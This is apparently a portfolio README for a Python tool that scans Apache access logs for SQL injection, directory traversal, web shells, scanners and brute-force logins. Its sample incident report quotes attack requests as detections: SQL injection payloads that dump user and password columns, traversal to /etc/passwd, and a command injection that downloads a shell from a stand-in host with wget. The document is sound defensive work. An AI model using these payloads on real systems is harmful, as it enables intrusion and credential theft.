# Python Log File Analyser for Threat Detection

This project is a lightweight, custom-built log analysis tool in Python. It's designed to simulate a core task of a SOC (Security Operations Centre) analyst by parsing a raw Apache `access.log` file to detect common cyber threats and generate a clear incident report.

This script demonstrates practical Python scripting for log analysis, directly supporting the skills I gained as an Advanced Application Engineering Analyst at Accenture. It shows how to hunt for Indicators of Compromise (IoCs) in static log files without relying on a full SIEM.

---

## Skills Demonstrated

* **Python Scripting:** Using built-in libraries like `re` (Regular Expressions) and `collections` (defaultdict) for efficient data parsing and stateful analysis.
* **Log Analysis:** Reading and interpreting the structure of Apache access logs to identify anomalous and malicious behaviour.
* **Regular Expressions (Regex):** Building robust and efficient regex patterns to detect a variety of attack signatures.
* **Threat Detection:** Identifying common web application attacks, including several from the **OWASP Top 10**:
    * SQL Injection (SQLi)
    * Directory Traversal
    * Command Injection
* **Incident Reporting:** Consolidating all findings into a clean, human-readable report that separates different threat types.

---

## How It Works

The `analyser.py` script reads the `sample_access.log` file line by line and performs two types of analysis:

1.  **Line-by-Line Threat Matching:** It uses a set of pre-compiled regex patterns to check every single line for known attack signatures.
2.  **Stateful Brute Force Detection:** It specifically monitors for `POST` requests to `/login.php` that result in a `401` (Unauthorized) status code. It uses a `defaultdict` to count these failures for each IP address. If an IP's failure count exceeds the `BRUTE_FORCE_THRESHOLD`, it is flagged in the final report.

All findings are then written to `incident_report.txt`.

### Detection Rules

The script actively hunts for the following IoCs:

* **SQL Injection (SQLi):** Catches `UNION SELECT`, `' OR 1=1`, blind SQLi functions (`SLEEP()`, `WAITFOR`), database schema enumeration (`INFORMATION_SCHEMA`), and query-truncation comments (`--`, `/*`).
* **Directory Traversal:** Detects `../` and its URL-encoded variants (e.g., `..%2F`).
* **Web Shell / Command Injection:** Looks for common web shell filenames (`c99.php`, `shell.php`) and command injection attempts (`cmd=`, `wget http`).
* **Vulnerability Scanners:** Identifies common User-Agent strings from tools like `Nmap` and `sqlmap`.
* **Brute Force:** Flags IPs with 5 or more failed login attempts.

---

## How to Use

This script uses only Python's standard libraries, so no `pip install` is required.

1.  **Clone the repository:**
    ```bash
    git clone [https://github.com/YourUsername/Your-Repo-Name.git](https://github.com/YourUsername/Your-Repo-Name.git)
    cd Your-Repo-Name
    ```

2.  **Set up and activate a virtual environment (Recommended):**
    ```bash
    # Windows
    python -m venv venv
    .\venv\Scripts\Activate.ps1
    
    # Mac/Linux
    python3 -m venv venv
    source venv/bin/activate
    ```

3.  **Run the analyser:**
    ```bash
    python analyser.py
    ```

4.  **Check the results:**
    A new file, `incident_report.txt`, will be created in the folder with all the findings.

---

## Example Output (`incident_report.txt`)

```text
--- INCIDENT REPORT --- 
Analysis of: sample_access.log

=== BRUTE FORCE ATTEMPTS ===
[BRUTE FORCE]: IP 10.0.0.88 had 9 failed login attempts.

=== OTHER DETECTED THREATS ===
[SQL INJECTION]: 10.0.0.88 - - [27/Oct/2025:10:32:05 +0100] "GET /products.php?id=1' OR 1=1--" 200 4012 "-" "python-requests/2.28.1"
[SCANNER ACTIVITY]: 212.22.13.5 - - [27/Oct/2025:10:34:00 +0100] "GET /admin/ HTTP/1.1" 404 567 "-" "Nmap Scripting Engine"
[SCANNER ACTIVITY]: 212.22.13.5 - - [27/Oct/2025:10:34:01 +0100] "GET /administrator/ HTTP/1.1" 404 567 "-" "Nmap Scripting Engine"
[SCANNER ACTIVITY]: 212.22.13.5 - - [27/Oct/2025:10:34:02 +0100] "GET /phpmyadmin/ HTTP/1.1" 404 567 "-" "Nmap Scripting Engine"
[SCANNER ACTIVITY]: 212.22.13.5 - - [27/Oct/2025:10:34:03 +0100] "GET /wp-admin/ HTTP/1.1" 404 567 "-" "Nmap Scripting Engine"
[DIR TRAVERSAL]: 212.22.13.5 - - [27/Oct/2025:10:35:10 +0100] "GET /page.php?file=../../../../etc/passwd" 404 568 "-" "python-requests/2.28.1"
[SQL INJECTION]: 10.0.0.88 - - [27/Oct/2025:10:36:15 +0100] "GET /products.php?id=1 UNION SELECT 1,2,user,pass FROM users--" 200 4012 "-" "sqlmap/1.6.3"
[WEB SHELL/CMD INJECTION]: 172.16.0.10 - - [27/Oct/2025:10:37:00 +0100] "GET /uploads/c99.php HTTP/1.1" 404 567 "-" "python-requests/2.28.1"
[SCANNER ACTIVITY]: 212.22.13.5 - - [27/Oct/2025:10:38:10 +0100] "GET /scripts/setup.sh HTTP/1.1" 404 567 "-" "Nmap Scripting Engine"
[SQL INJECTION]: 10.0.0.88 - - [27/Oct/2025:10:38:15 +0100] "GET /products.php?id=1 AND 1=1" 200 4012 "-" "sqlmap/1.6.3"
[WEB SHELL/CMD INJECTION]: 172.16.0.10 - - [27/Oct/2025:10:38:30 +0100] "GET /shell.php?cmd=ls" 404 567 "-" "python-requests/2.28.1"
[SQL INJECTION]: 10.0.0.88 - - [27/Oct/2025:10:39:00 +0100] "GET /products.php?id=1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x7e,(SELECT (ELT(1,1))),0x7e) AS x FROM INFORMATION_SCHEMA.TABLES GROUP BY x) AS y) AND '1'='1" 200 4012 "-" "sqlmap/1.6.3"
[WEB SHELL/CMD INJECTION]: 212.22.13.5 - - [27/Oct/2025:10:40:02 +0100] "GET /index.php?cmd=cd /tmp/;wget [http://badsite.com/shell.txt](http://badsite.com/shell.txt)" 200 167 "-" "python-requests/2.28.1"
[WEB SHELL/CMD INJECTION]: 172.16.0.10 - - [27/Oct/2025:10:42:00 +0100] "GET /uploads/shell.php HTTP/1.1" 404 567 "-" "python-requests/2.28.1"
[SQL INJECTION]: 10.0.0.88 - - [27/Oct/2025:10:42:05 +0100] "GET /products.php?id=1 AND (SELECT (CASE WHEN (1=1) THEN SLEEP(5) ELSE 1 END))" 200 4012 "-" "sqlmap/1.6.3"
[WEB SHELL/CMD INJECTION]: 172.16.0.10 - - [27/Oct/2025:10:42:30 +0100] "GET /admin.php HTTP/1.1" 404 567 "-" "python-requests/2.28.1"
[DIR TRAVERSAL]: 212.22.13.5 - - [27/Oct/2025:10:42:33 +0100] "GET /page.php?file=..%2F..%2F..%2Fetc%2Fhosts" 404 568 "-" "python-requests/2.28.1"
[WEB SHELL/CMD INJECTION]: 172.16.0.10 - - [27/Oct/2025:10:43:15 +0100] "GET /bypass.php?cmd=whoami" 404 567 "-" "python-requests/2.28.1"

--- END OF REPORT --- 
```